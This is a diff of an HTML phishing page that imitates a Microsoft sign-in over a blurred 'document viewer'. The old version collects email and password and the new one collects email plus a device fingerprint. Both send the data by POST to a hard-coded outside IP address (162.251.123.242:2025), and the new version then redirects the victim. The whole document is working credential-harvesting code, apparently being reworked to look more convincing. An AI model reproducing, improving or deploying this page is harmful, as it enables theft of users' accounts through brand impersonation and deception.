@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Authentication Portal</title>
+    <title>Document Viewer</title>
     <style>
         html, body {
             height: 100%;
@@ -17,132 +17,99 @@
             border: none;
             transition: filter 0.5s ease;
         }
-        #authContainer {
+        #authDialog {
             position: absolute;
             width: 450px;
             height: 350px;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-            padding: 30px;
+            background: #fff;
+            padding: 20px;
             box-sizing: border-box;
             opacity: 0;
             transition: opacity 1s ease;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
         }
         #logo {
             width: 120px;
             height: auto;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
-        .status-message {
+        #statusMessage {
             color: #000;
-            font-size: 20px;
+            font-size: 26.5px;
             margin: 10px 0;
             font-weight: 500;
-            transition: opacity 0.5s ease;
+            transition: opacity 1s ease;
         }
-        .throbber-container {
+        .loader {
             height: 20px;
             margin: 20px 0;
             overflow: hidden;
         }
-        .throbber {
+        .loader-dots {
             display: flex;
             width: 500%;
             height: 100%;
-            animation: moveThrobber 6s ease-in-out infinite;
+            animation: moveDots 6s ease-in-out infinite;
         }
-        .throbber div {
+        .loader-dots div {
             width: 4px;
             height: 4px;
             background: #005da6;
             border-radius: 50%;
             margin: 0 8px;
-            animation: throb 1.5s ease-in-out infinite;
+            animation: pulse 1.5s ease-in-out infinite;
         }
         #loginForm {
             display: none;
-            text-align: left;
         }
         #loginForm input {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+            border: none;
+            border-bottom: 1px solid #005da6;
             font-size: 16px;
-            transition: border 0.3s ease;
-        }
-        #loginForm input:focus {
-            border-color: #005da6;
-            outline: none;
         }
         #loginForm button {
-            background-color: #005da6;
+            background: #005da6;
             color: white;
             border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
+            padding: 8px 15px;
             float: right;
-            transition: background 0.3s ease;
+            cursor: pointer;
         }
-        #loginForm button:hover {
-            background-color: #004b8c;
-        }
-        #loginForm button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        .footer-links {
+        .links {
             clear: both;
             padding-top: 20px;
             font-size: 13px;
         }
-        .footer-links a {
+        .links a {
             color: #005da6;
             text-decoration: none;
         }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        .error-message {
-            color: #d83b01;
-            font-size: 14px;
-            margin-top: -10px;
-            margin-bottom: 15px;
-            display: none;
-        }
-        @keyframes moveThrobber {
+        @keyframes moveDots {
             0% { transform: translateX(-100%); }
             50% { transform: translateX(0); }
             100% { transform: translateX(100%); }
         }
-        @keyframes throb {
+        @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.5); }
-        }
-        @media (max-width: 600px) {
-            #authContainer {
-                width: 90%;
-                top: 40%;
-            }
         }
     </style>
 </head>
 <body>
-    <iframe id="backgroundView" src="about:blank" aria-hidden="true"></iframe>
+    <iframe id="docViewer" src="about:blank"></iframe>
     
-    <div id="authContainer">
-        <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Company Logo">
-        <p id="statusMessage" class="status-message">Initializing secure session...</p>
+    <div id="authDialog">
+        <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Logo">
+        <p id="statusMessage">Preparing your session</p>
         
-        <div id="loadingIndicator" class="throbber-container">
-            <div class="throbber">
+        <div class="loader">
+            <div class="loader-dots">
                 <div></div>
                 <div></div>
                 <div></div>
@@ -152,184 +119,83 @@
         </div>
         
         <div id="loginForm">
-            <p id="signInText" class="status-message">Sign in to your account</p>
+            <p id="signInText">Sign in</p>
             <form id="authForm">
-                <input type="email" id="email" placeholder="Email address" aria-label="Email address" required>
-                <div id="emailError" class="error-message">Please enter a valid email address</div>
-                <input type="password" id="password" placeholder="Password" aria-label="Password" required>
-                <div id="passwordError" class="error-message">Password is required</div>
-                <button type="submit" id="submitBtn">Sign in</button>
+                <input type="text" id="email" placeholder="Email, phone, or Skype" required>
+                <button type="submit">Next</button>
             </form>
-            
-            <div class="footer-links">
-                <a href="#" id="createAccount">Create account</a> • 
-                <a href="#" id="forgotPassword">Forgot password?</a> • 
-                <a href="#" id="helpLink">Help</a>
+            <div class="links">
+                <a href="#">Create account</a> • 
+                <a href="#">Forgot password?</a>
             </div>
         </div>
     </div>
 
     <script>
-        // DOM Elements
-        const authContainer = document.getElementById('authContainer');
-        const backgroundView = document.getElementById('backgroundView');
-        const statusMessage = document.getElementById('statusMessage');
-        const loadingIndicator = document.getElementById('loadingIndicator');
-        const loginForm = document.getElementById('loginForm');
-        const authForm = document.getElementById('authForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
-
-        // Configuration
-        const config = {
-            rdpServer: 'http://162.251.123.242:2025', // Replace with your RDP server address
-            endpoint: '/process-auth',
-            backgroundImage: 'https://example.com/background.jpg',
-            initDelay: 1000,
-            blurDelay: 2000,
-            showFormDelay: 4000
+        // Collect device info
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
         };
 
         // Initialize the page
         function init() {
-            // Set background
-            backgroundView.src = config.backgroundImage;
-            
-            // Start the authentication flow
-            setTimeout(startAuthFlow, config.initDelay);
+            setTimeout(blurBackground, 2000);
+            setTimeout(showAuthDialog, 3000);
+            setTimeout(showLoginForm, 6000);
         }
 
-        // Authentication flow
-        function startAuthFlow() {
-            // Apply blur to background
-            setTimeout(() => {
-                backgroundView.style.filter = 'blur(5px)';
-                authContainer.style.opacity = '1';
-            }, config.blurDelay);
-
-            // Simulate security checks
-            setTimeout(() => {
-                statusMessage.textContent = "Checking security protocols...";
-            }, config.blurDelay + 1000);
-
-            // Show login form
-            setTimeout(() => {
-                statusMessage.style.opacity = '0';
-                loadingIndicator.style.opacity = '0';
-                
-                setTimeout(() => {
-                    statusMessage.remove();
-                    loadingIndicator.remove();
-                    loginForm.style.display = 'block';
-                }, 500);
-            }, config.showFormDelay);
+        function blurBackground() {
+            document.getElementById('docViewer').style.filter = 'blur(5px)';
         }
 
-        // Form validation
-        function validateForm() {
-            let isValid = true;
-            
-            // Email validation
-            if (!emailInput.value || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
-                emailError.style.display = 'block';
-                isValid = false;
-            } else {
-                emailError.style.display = 'none';
-            }
-            
-            // Password validation
-            if (!passwordInput.value) {
-                passwordError.style.display = 'block';
-                isValid = false;
-            } else {
-                passwordError.style.display = 'none';
-            }
-            
-            return isValid;
+        function showAuthDialog() {
+            document.getElementById('authDialog').style.opacity = '1';
+            document.getElementById('statusMessage').textContent = "Checking your credentials...";
+        }
+
+        function showLoginForm() {
+            document.getElementById('statusMessage').style.opacity = '0';
+            document.querySelector('.loader').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('loginForm').style.display = 'block';
+            }, 1000);
         }
 
         // Handle form submission
-        async function handleSubmit(event) {
-            event.preventDefault();
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            if (!validateForm()) return;
+            const email = document.getElementById('email').value;
+            if (!email) return;
+            
+            // Add email to device info
+            deviceInfo.email = email;
             
             try {
-                // Update UI
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Authenticating...';
-                
-                // Prepare data
-                const formData = {
-                    email: emailInput.value,
-                    password: passwordInput.value,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    ip: await fetchIP()
-                };
-                
-                // Send to RDP server
-                const response = await fetch(`${config.rdpServer}${config.endpoint}`, {
+                const response = await fetch('http://162.251.123.242:2025/submit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'X-Requested-With': 'XMLHttpRequest'
                     },
-                    body: JSON.stringify(formData)
+                    body: JSON.stringify(deviceInfo)
                 });
                 
-                if (!response.ok) throw new Error('Network response was not ok');
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    // Successful authentication
-                    statusMessage.textContent = "Authentication successful!";
-                    statusMessage.style.color = "#107c10";
-                    statusMessage.style.opacity = '1';
-                    loginForm.style.opacity = '0.5';
-                    
-                    // Redirect or proceed with next steps
-                    if (data.redirectUrl) {
-                        setTimeout(() => {
-                            window.location.href = data.redirectUrl;
-                        }, 1500);
-                    }
-                } else {
-                    // Authentication failed
-                    throw new Error(data.message || 'Authentication failed');
+                if (response.ok) {
+                    window.location.href = "https://example.com/redirect";
                 }
             } catch (error) {
-                console.error('Authentication error:', error);
-                statusMessage.textContent = error.message || "Authentication failed. Please try again.";
-                statusMessage.style.color = "#d83b01";
-                statusMessage.style.opacity = '1';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Sign in';
+                console.error('Error:', error);
             }
-        }
+        });
 
-        // Fetch client IP (simplified)
-        async function fetchIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip || 'unknown';
-            } catch {
-                return 'unknown';
-            }
-        }
-
-        // Event listeners
-        authForm.addEventListener('submit', handleSubmit);
-        emailInput.addEventListener('input', () => emailError.style.display = 'none');
-        passwordInput.addEventListener('input', () => passwordError.style.display = 'none');
-
-        // Initialize
-        document.addEventListener('DOMContentLoaded', init);
+        // Start the flow
+        window.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
 </html>
